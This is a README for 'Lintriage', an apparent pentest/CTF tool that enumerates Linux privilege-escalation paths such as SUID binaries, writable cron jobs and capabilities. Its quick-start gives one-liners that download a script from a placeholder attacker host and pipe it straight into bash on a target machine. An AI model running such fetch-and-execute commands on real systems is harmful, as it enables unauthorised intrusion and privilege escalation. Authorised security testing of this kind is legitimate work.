# Lintriage

**Linux Privilege Escalation Auto-Triage Tool**

Focused Linux priv esc enumeration - no fluff. Outputs findings in HIGH/MEDIUM/INFO format with nice colours!

## Quick Start

**On your machine:**
```bash
python3 lintriage.py serve
```

**On target machine:**
```bash
wget -qO- http://<YOUR_IP>:8000/lintriage.sh | bash
# or
curl -s http://<YOUR_IP>:8000/lintriage.sh | bash
```

The helper will show you the exact commands to run. The bash script has zero dependencies - just standard Linux tools.

## Output Format

Findings are organized by severity:
- **HIGH** - Usually exploitable, check these first (red)
- **MEDIUM** - Might be exploitable, worth a look (yellow)  
- **INFO** - Just info, might be useful (blue)

## Requirements

**On your machine:** Python 3.6+ to run the helper

**On target:** Just bash and standard Linux tools (find, getcap, uname, etc.). No Python needed.

## Example Output

```
  ██      ██ ███    ██ ████████ ██████  ██  █████   ██████  ███████ 
  ██      ██ ████   ██    ██    ██   ██ ██ ██   ██ ██       ██      
  ██      ██ ██ ██  ██    ██    ██████  ██ ███████ ██   ███ █████   
  ██      ██ ██  ██ ██    ██    ██   ██ ██ ██   ██ ██    ██ ██      
  ███████ ██ ██   ████    ██    ██   ██ ██ ██   ██  ██████  ███████ 
                                                                                                                  
        Linux Privilege Escalation Auto-Triage Tool              
        Focused enumeration without the noise                    


✓ SUID binaries [completed]
✓ Writable cron jobs [completed]
✓ Writable systemd services [completed]
✓ Linux capabilities [completed]
✓ Interesting files [completed]
✓ Kernel version [completed]

┌────────────────────────────────────────────────────────────┐
│  ⚠  HIGH SEVERITY FINDINGS                                 │
└────────────────────────────────────────────────────────────┘

• [1] SUID Binary
   ➜ Dangerous SUID binary found: /usr/bin/find
   └─ Binary: find - Known to be exploitable

╔════════════════════════════════════════════════════════════╗
║                        SUMMARY                             ║
╠════════════════════════════════════════════════════════════╣
║  HIGH:   1  │  MEDIUM: 3  │  INFO:   5  │  TOTAL: 9        ║
╚════════════════════════════════════════════════════════════╝
```

## Files

```
Lintriage/
├── lintriage.py          # Helper tool to serve the script
├── builds/
│   └── lintriage.sh      # The actual enumeration script
├── README.md
└── LICENSE
```

- `lintriage.py` - Run this on your machine as a helper, can also just serve the `.sh` file with a python3 http server.
- `builds/lintriage.sh` - The enumeration script.

## Quick start

1. On your machine: `python3 lintriage.py serve`
2. On target: Copy one of the commands it shows you, or use the one-liner
3. Wait for results

That's it. No manual file uploads, no installing dependencies on the target.

## License

See LICENSE file for details.

